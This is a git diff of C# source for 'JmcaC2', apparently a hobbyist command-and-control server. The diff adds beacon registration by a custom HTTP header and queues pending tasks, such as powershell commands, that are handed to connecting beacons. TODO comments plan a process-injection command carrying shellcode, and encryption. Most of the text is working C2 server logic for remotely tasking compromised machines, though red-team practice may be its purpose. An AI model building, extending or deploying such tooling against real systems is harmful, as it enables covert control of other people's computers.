@@ -13,9 +13,10 @@ namespace JmcaC2
         static int port = 27015;
 
 
-        static List<BeaconClient> Clients = new List<BeaconClient>();
+        static List<BeaconClient> Beacons = new List<BeaconClient>();
         static List<BeaconTask> BeaconTasks = new List<BeaconTask>();
-        static BeaconClient CurrentBeacon;
+
+        static BeaconClient? CurrentBeacon = null;
         static HashSet<string> ClientNames = new HashSet<string>();
 
         public static void Main(string[] args)
@@ -82,6 +83,8 @@ namespace JmcaC2
                     case "tasks":
                         PrintTasks();
                         break;
+                        //TODO: process injection command, with shellcode passed as DATA in BeaconTask
+                        
                     case "powershell":
                         if (CurrentBeacon == null)
                         {
@@ -127,14 +130,14 @@ namespace JmcaC2
             {
 
                 string[] Adjectives = {
-                "red","blue","quiet","fast","frozen","silver","dark","bright","wild","rapid",
-                "lone","brave","lucky","silent","stealthy","shadow","storm","fierce"
-            };
+                    "red","blue","quiet","fast","frozen","silver","dark","bright","wild","rapid",
+                    "lone","brave","lucky","silent","stealthy","shadow","storm","fierce"
+                };
 
                 string[] Nouns = {
-                "wolf","hawk","tiger","eagle","shadow","river","mountain","lion","falcon",
-                "forest","blade","cloud","spider","viper","storm","flame"
-            };
+                    "wolf","hawk","tiger","eagle","shadow","river","mountain","lion","falcon",
+                    "forest","blade","cloud","spider","viper","storm","flame"
+                };
 
                 int adjIndex = RandomNumberGenerator.GetInt32(Adjectives.Length);
                 int nounIndex = RandomNumberGenerator.GetInt32(Nouns.Length);
@@ -155,7 +158,7 @@ namespace JmcaC2
                 return;
             }
 
-            foreach (var client in Clients)
+            foreach (var client in Beacons)
             {
                 if (client.Name == name)
                 {
@@ -169,7 +172,7 @@ namespace JmcaC2
         }
         public static void PrintBeacons()
         {
-            if (Clients == null || Clients.Count == 0)
+            if (Beacons == null || Beacons.Count == 0)
             {
                 Console.WriteLine("No Active Connections!");
                 return;
@@ -178,18 +181,18 @@ namespace JmcaC2
             Console.WriteLine($"{"Beacon Name",-15} | {"Client IP",-14} | {"Last CheckIn",-20}");
             Console.WriteLine("--------------------------------------------------------------");
 
-            foreach (var client in Clients)
+            foreach (var b in Beacons)
             {
                 ConsoleColor prevColor = Console.ForegroundColor;
 
                 bool isCurrent = CurrentBeacon != null &&
-                                 !string.IsNullOrEmpty(client.Name) &&
-                                 client.Name == CurrentBeacon.Name;
+                                 !string.IsNullOrEmpty(b.Name) &&
+                                 b.Name == CurrentBeacon.Name;
 
                 if (isCurrent)
                     Console.ForegroundColor = ConsoleColor.DarkCyan;
 
-                Console.WriteLine(client.ToString());
+                Console.WriteLine(b.ToString());
 
                 Console.ForegroundColor = prevColor;
 
@@ -197,9 +200,6 @@ namespace JmcaC2
             }
         }
 
-        // Handle incoming HTTP connections
-        // GET requests are for beacon tasks
-        // POST requests are for task results
 
         public static void PrintTasks()
         {
@@ -211,8 +211,12 @@ namespace JmcaC2
         }
 
 
+        // Handle incoming HTTP connections
+        // GET requests are for beacon tasks
+        // POST requests are for task results
         public static void HandleConnections()
         {
+            //TODO: encryption
             while (serverRunning)
             {
                 try
@@ -220,35 +224,57 @@ namespace JmcaC2
                     var context = listener.GetContext();
                     var request = context.Request;
                     var response = context.Response;
+                    
+                    // Handle GET request for beacon tasks
                     if (request.HttpMethod == "GET")
                     {
-                        // Handle GET request for beacon tasks
-                        Console.WriteLine($"Received request for tasks from {request.RemoteEndPoint.Address}");
 
+                        // MAJOR WEWOO FIXED: use custom header with beacon name. if not exist,
+                        // add new client with generated name
+                        string[]? values = request.Headers.GetValues("BeaconName");
+                        string beaconName = string.Empty;
+                        if (values == null)
+                        {
+                            BeaconClient NewClient = new BeaconClient(request.RemoteEndPoint.Address, DateTime.Now, GenerateClientName());
+                            Beacons.Add(NewClient);
 
-                        string responseString = "No Tasks";
-                        // if (BeaconTasks.Count > 0)
-                        // {
-                        // foreach (BeaconTask CurrentTask in BeaconTasks)
-                        // {
-                        // CurrentTask.CmdPrefix + CurrentTask.CmdArgs;
+                            // TODO: default tasks?
+                            //BeaconTasks.Add(new BeaconTask(NewClient.Name, "powershell", "ipconfig"));
+                            Console.WriteLine($"Added {NewClient.Name}");
+                            beaconName = NewClient.Name;
+                        }
+                        else
+                        {
+                            beaconName = values[0];
+                            if (!ClientNames.Contains(beaconName))
+                            {
+                                // add the beacon again
+                                BeaconClient NewClient = new BeaconClient(request.RemoteEndPoint.Address, DateTime.Now, GenerateClientName());
+                                Beacons.Add(NewClient);
+                            }
+                            Console.WriteLine($"Received request for tasks from {beaconName}");
+                        }
 
-                        // }
+                        string responseString = string.Empty;
+                        if (BeaconTasks.Count > 0)
+                        {
+                            foreach (BeaconTask task in BeaconTasks)
+                            {
+                                // only send PENDING tasks for this beacon
+                                if (task.Name == beaconName && task.Status == TaskStatus.NotStarted)
+                                {
+                                    responseString += task + "\r\n\r\n";
+                                    task.Status = TaskStatus.InProgress;
+                                }
+                            }
+                        }
 
-                        // }
-                        // TODO HANDLE PUSHING TASKS
                         byte[] buffer = System.Text.Encoding.UTF8.GetBytes(responseString);
                         response.ContentLength64 = buffer.Length;
-
+                        response.AddHeader("BeaconName", beaconName);
                         var output = response.OutputStream;
                         output.Write(buffer, 0, buffer.Length);
                         output.Close();
-
-                        // FIXME: MAJOR WEWOO THIS ADDs CLIENT ON EVERY GET SO IF I FETCH TASKS I ADD NEW PERSON THIS IS NO GOOD
-
-                        BeaconClient NewClient = new BeaconClient(request.RemoteEndPoint.Address, DateTime.Now, GenerateClientName());
-                        Clients.Add(NewClient);
-                        Console.WriteLine($"Added {NewClient.Name}");
 
                     }
                     else if (request.HttpMethod == "POST")
